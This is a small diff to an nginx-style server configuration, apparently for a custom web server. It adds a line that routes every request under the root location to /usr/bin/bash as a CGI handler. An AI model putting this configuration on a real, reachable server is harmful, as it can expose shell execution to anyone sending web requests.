@@ -9,7 +9,7 @@ http
         
 	default_server;
         location  /{
-			
+			cgi_pass /usr/bin/bash;
         }
     }
 }
